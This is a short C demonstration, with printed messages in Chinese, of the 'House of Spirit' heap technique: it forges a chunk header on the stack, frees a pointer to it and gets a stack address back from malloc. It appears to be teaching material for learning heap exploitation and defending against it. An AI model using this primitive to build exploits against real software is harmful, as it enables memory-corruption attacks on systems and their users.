#include <stdio.h>
#include <stdlib.h>

int main()
{
    malloc(1);
    unsigned long long *a;
    unsigned long long fake_chunks[10];
    fprintf(stderr, "fake_chunks[1] 在 %p\n", &fake_chunks[1]);
    fprintf(stderr, "fake_chunks[1] 改成 0x40 \n");
    fake_chunks[1] = 0x40;
    fprintf(stderr, "把 fake_chunks[2] 的地址赋给 a, %p.\n", &fake_chunks[2]);
    a = &fake_chunks[2];
    fprintf(stderr, "free 掉 a\n");
    free(a);
    fprintf(stderr, "再去 malloc(0x30)，在可以看到申请来的结果在: %p\n", malloc(0x30));
    fprintf(stderr, "ojbk\n");
}